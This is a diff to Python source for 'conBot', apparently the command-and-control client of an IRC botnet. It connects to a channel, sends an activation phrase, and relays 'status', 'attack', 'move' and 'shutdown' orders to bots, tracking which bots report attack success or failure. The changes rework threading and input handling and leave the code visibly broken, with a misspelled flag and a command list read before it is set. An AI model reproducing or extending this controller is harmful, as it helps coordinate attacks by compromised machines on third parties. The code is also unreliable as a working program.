@@ -58,10 +58,12 @@ class conBot(threading.Thread):
         self.moveBotList = []
         self.disconnectedBotList = []
         self.isConnected = False
+        self.inputReceived = False
         threading.Thread.__init__ ( self ) 
         
         self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    
         
         try:
             self.s.connect((self.host, self.port)) 
@@ -77,6 +79,7 @@ class conBot(threading.Thread):
         #self.inputThread.run()
         #self.connection()\
         print("line 79")
+        
         self.inputLoop()
         
     def createNick(self, nick):
@@ -157,24 +160,36 @@ class conBot(threading.Thread):
                 self.run(cBot)
                 
     def inputLoop(self):
-        threading.Thread(target = self.connection).start()
+        self.connectIRC(self.s,self.NICK,self.chan)        
+        self.comList.append(self.activationPhrase)
+        
         while True:
             #print("line 161")  
-            self.command = ""         
-            time.sleep(5) 
-            if(self.isConnected):
+            #self.command = ""         
+            #time.sleep(5) 
+            if(not self.isConnected):
                 try:
-                    userCommand = input("Please enter a valid command:")            
+                    #print("Please enter a valid command:")                                      
+                    threading.Thread(target = self.connection).start()
+                    time.sleep(5)
+                    #userCommand = input("Please enter a valid command:")   
+                    #sys.stdin.write(userCommand)            
                     #userCommand = input("Please enter a valid command:")
-                    if(userCommand not in self.comList):
-                        raise ValueError
-                    else:
-                        self.command = userCommand.split()
+                    #sys.stdout.write(userCommand)
+                    #if(userCommand not in self.comList):
+                        #raise ValueError
+                    #else:
+                        #self.command = userCommand.split()
+                        #threading.Thread(target = self.connection).start()
                         #sys.stdout.write(userCommand)
                     #sys.stdout.flush()
-                except ValueError:
-                    self.inputLoop()
-                              
+                except ValueError as v:
+                    #self.inputLoop()
+                    print(v)
+            else:
+                userCommand = input("Please enter a valid command:")
+                self.inputRecieved = True
+                time.sleep(5) 
                 if(self.command[0] == "status"):
                     lock = threading.Lock()
                     with lock:
@@ -193,11 +208,11 @@ class conBot(threading.Thread):
                 elif self.command == "quit":
                     sys.exit()
                 #print("Enter valid command: ")
-            else:
+            #else:
                 #print("line 194")
                 #threading.Thread(target = self.connection).start()
                 #print("testing")
-                time.sleep(5) 
+                #time.sleep(5) 
             
                 
     def processCommand(self):
@@ -246,61 +261,62 @@ class conBot(threading.Thread):
     def connection(self):
     
         print("line 244")
-        self.connectIRC(self.s,self.NICK,self.chan)        
-        self.comList.append(self.activationPhrase)
-        getInput = True
+        #self.connectIRC(self.s,self.NICK,self.chan)        
+        #self.comList.append(self.activationPhrase)
+        #getInput = True
         print("Connected to IRC...")
         count =0  
         socket_list = [ sys.stdin, self.s ]
-        #isconnected = False
+        #self.isconnected = Truye
         try:
             while True:
-                read_socks, write_socks, error_socks = select.select(socket_list,[],[])
-                for sock in read_socks:
-                    if(sock == self.s):
-                        responses = self.s.recv(4096).decode("utf-8").split("\r\n")
-                        for response in responses:
-                            if(response != ""):
-                                (prefix, command, args) = self.parsemsg(response)            
-                                #print((prefix,command,args))
-                                print(response)
-                                if(command == '353'):
-                                    print("line 170")                                    
-                                    self.isConnected = True                                                                   
-                                elif command == "PRIVMSG":
-                                    #self.isConnected = True
-                                    test = args[1].split()
-                                    print("prefix: " + prefix)
-                                    if(test[0] in self.responses):
-                                        self.handleResponse(prefix,test)                                    
-                                elif command == "PING":
-                                    self.s.send("PONG {}: :\r\n".format(prefix).encode("utf-8"))                                                                          
-                                elif command == '433':
-                                    self.createNick(NICK)
-                                    self.connectIRC(self.s,self.NICK, self.chan)
-                         
-                    elif (sock == sys.stdin):
-                        #self.command = sys.stdin.readline().split()
-                        print("command = ")
-                        print(self.command)
-                        if(self.command[0] == self.activationPhrase):
-                            self.isConnected = True
-                            self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, self.command[0]).encode("utf-8"))
-                        elif(self.command[0] == "status") :  
-                            self.botList = []                  
-                            self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, "!"+self.command[0]).encode("utf-8"))
-                        elif(self.command[0] == "attack") :  
-                            self.attackBotListSucc = []
-                            self.attackBotListFail = []                  
-                            self.s.send("PRIVMSG {} : {} {} {}\r\n".format(self.chan, "!"+self.command[0],self.command[1],self.command[2]).encode("utf-8"))
-                        elif(self.command[0] == "move"):
-                            self.moveBotList = []
-                            self.s.send("PRIVMSG {} : {} {} {} {}\r\n".format(self.chan,"!"+self.command[0],self.command[1],self.command[2],self.command[3]).encode("utf-8"))
-                        elif(self.command[0] == "shutdown"):
-                            self.disconnectedBotList = []
-                            self.s.send("PRIVMSG {} : {}\r\n".format(self.chan,"!"+self.command[0]).encode("utf-8"))
-                        elif(self.command[0] == "quit"):
-                            sys.exit(0)
+                #read_socks, write_socks, error_socks = select.select(socket_list,[],[])
+                #for sock in read_socks:
+                    #if(sock == self.s):
+                response = self.s.recv(4096).decode("utf-8")
+                #for response in responses:
+                if(response != ""):
+                    (prefix, command, args) = self.parsemsg(response)            
+                    #print((prefix,command,args))
+                    print(response)
+                    if(command == '353'):
+                        print("line 170")                                    
+                        self.isConnected = True                                                                   
+                    elif command == "PRIVMSG":
+                        #self.isConnected = True
+                        test = args[1].split()
+                        print("prefix: " + prefix)
+                        if(test[0] in self.responses):
+                            self.handleResponse(prefix,test)                                    
+                    elif command == "PING":
+                        self.s.send("PONG {}: :\r\n".format(prefix).encode("utf-8"))                                                                          
+                    elif command == '433':
+                        self.createNick(NICK)
+                        self.connectIRC(self.s,self.NICK, self.chan)                         
+                print("line 293")
+                #if(sock == sys.stdin):
+                if(self.inputReceived):    
+                    self.command = sys.stdin.readline().split()                    
+                    print("command = ")
+                    print(self.command)
+                    if(self.command[0] == self.activationPhrase):
+                        self.isConnected = True
+                        self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, self.command[0]).encode("utf-8"))
+                    elif(self.command[0] == "status") :  
+                        self.botList = []                  
+                        self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, "!"+self.command[0]).encode("utf-8"))
+                    elif(self.command[0] == "attack") :  
+                        self.attackBotListSucc = []
+                        self.attackBotListFail = []                  
+                        self.s.send("PRIVMSG {} : {} {} {}\r\n".format(self.chan, "!"+self.command[0],self.command[1],self.command[2]).encode("utf-8"))
+                    elif(self.command[0] == "move"):
+                        self.moveBotList = []
+                        self.s.send("PRIVMSG {} : {} {} {} {}\r\n".format(self.chan,"!"+self.command[0],self.command[1],self.command[2],self.command[3]).encode("utf-8"))
+                    elif(self.command[0] == "shutdown"):
+                        self.disconnectedBotList = []
+                        self.s.send("PRIVMSG {} : {}\r\n".format(self.chan,"!"+self.command[0]).encode("utf-8"))
+                    elif(self.command[0] == "quit"):
+                        sys.exit(0)
                             
 
                                                        
